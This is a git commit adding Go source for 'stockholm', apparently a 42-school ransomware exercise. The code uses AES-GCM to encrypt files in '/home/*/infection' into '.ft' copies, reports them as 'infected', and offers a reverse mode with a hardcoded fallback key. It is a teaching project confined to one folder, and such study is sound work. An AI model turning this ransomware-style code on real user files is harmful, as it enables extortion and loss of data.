d9ff616945092e20f368597c680170d839af86cb
Alexis <aloubier@student.42.fr>
2025-11-26 20:52:29 +0100

    Working prototype with main logic done

---
+++ crypt/crypt.go
@@ -0,0 +1,76 @@
+package crypt 
+
+import (
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"fmt"
+	"io"
+	"os"
+)
+
+func EncryptFile(key []byte, inputPath, outputPath string) error {
+	// Read file to encrypt
+	plaintext, err := os.ReadFile(inputPath)
+	if err != nil {
+		return err
+	}
+
+	// Create AES cipher
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return err
+	}
+
+	// Create GCM mode
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return err
+	}
+
+	// Generate random nonce
+	nonce := make([]byte, gcm.NonceSize())
+	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
+		return err
+	}
+
+	// Encrypt
+	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
+
+	// Write nonce + ciphertext to output file
+	return os.WriteFile(outputPath, ciphertext, 0644)
+}
+
+func DecryptFile(key []byte, inputPath, outputPath string) error {
+	ciphertext, err := os.ReadFile(inputPath)
+	if err != nil {
+		return err
+	}
+
+	// Create AES cipher
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return err
+	}
+
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return err
+	}
+
+	nonceSize := gcm.NonceSize()
+	if len(ciphertext) < nonceSize {
+		return fmt.Errorf("ciphertext too short")
+	}
+
+	nonce := ciphertext[:nonceSize]
+	data := ciphertext[nonceSize:]
+
+	// Decrypt
+	plaintext, err := gcm.Open(nil, nonce, data, nil)
+	if err != nil {
+		return err
+	}
+
+	return os.WriteFile(outputPath, plaintext, 0644)
+}
---
+++ main.go
@@ -0,0 +1,135 @@
+package main
+
+import (
+	"fmt"
+	"os"
+	"strings"
+	"path/filepath"
+	"crypto/sha256"
+
+	"stockholm/crypt"
+)
+
+type StockholmOptions struct {
+	key []byte 
+	silent bool
+	reverse bool
+}
+
+func ErrorExit(err error) {
+	fmt.Println(err)
+	os.Exit(1)
+}
+
+func hasFlag(args []string, flags ...string) bool {
+	for _, arg := range args {
+		for _, f := range flags {
+			if arg == f {
+				return true
+			}
+		}
+	}
+	return false
+}
+
+func getInfoFlags(argList []string) () {
+	if hasFlag(argList, "-h", "--help") {
+		fmt.Println("Stockholm help:")
+		fmt.Println("-h, --help: Show this help menu")
+		fmt.Println("-v, --version: Get version number")
+		fmt.Println("-r, --reverse: Reverse the encryption on .ft files")
+		fmt.Println("-s, --silent: Reverse the encryption on .ft files")
+		os.Exit(0)
+	}
+	if hasFlag(argList, "-v", "--version") {
+		fmt.Println("stockholm version 0.1.0")
+		os.Exit(0)
+	}
+}
+
+func parser(argList []string) (*StockholmOptions, error) {
+	getInfoFlags(argList)
+	ret := StockholmOptions{
+		key: []byte(""),
+		silent: false,
+		reverse: false,
+	}
+	key_value := os.Getenv("STOCKHOLM_KEY")
+	if key_value == "" {
+		fmt.Println("STOCKHOLM env value not set or empty")
+		fmt.Println("Using fallback")
+		key_value = "ALLYOURBASESAREBELONGTOUS"
+	}
+	hash := sha256.Sum256([]byte(key_value))
+	ret.key = hash[:]
+
+
+	if hasFlag(argList, "-s", "--silent") {
+		ret.silent = true
+	}
+	if hasFlag(argList, "-r", "--reverse") {
+		ret.reverse = true
+	}
+	return &ret, nil
+}
+
+// Retrieve the content of the infection dir
+func getInfectionFiles(reverse bool) ([]string, error) {
+	pattern := "/home/*/infection"
+	if reverse {
+		pattern = "/home/*/infection/*.ft"
+	}
+
+	matches, _ := filepath.Glob(pattern)
+	for _, path := range matches {
+		fmt.Println("Found:", path)
+	}
+	return matches, nil
+}
+
+func reverseInfection(opts *StockholmOptions) {
+	files, err := getInfectionFiles(opts.reverse)
+	if err != nil {
+		ErrorExit(err)
+	}
+	for _, file := range(files) {
+		cleaned := strings.TrimSuffix(file, ".ft")
+		err = crypt.DecryptFile(opts.key, file, cleaned)
+		if err != nil {
+			fmt.Println(err)
+		}
+		if !opts.silent {
+			fmt.Printf("[%s] infection reversed\n", file)
+		}
+	}
+}
+
+func runInfection(opts *StockholmOptions) {
+	files, err := getInfectionFiles(opts.reverse)
+	if err != nil {
+		ErrorExit(err)
+	}
+	for _, file := range(files) {
+		err = crypt.EncryptFile(opts.key, file, file + ".ft")
+		if err != nil {
+			fmt.Println(err)
+		}
+		if !opts.silent {
+			fmt.Printf("[%s] infected\n", file)
+		}
+	}
+}
+
+func main() {
+	fmt.Println("Program started")
+	opts, err := parser(os.Args)
+	if err != nil {
+		ErrorExit(err)
+	}
+	if opts.reverse == true {
+		reverseInfection(opts)
+	} else {
+		runInfection(opts)
+	}
+	fmt.Println("Done.")
+}
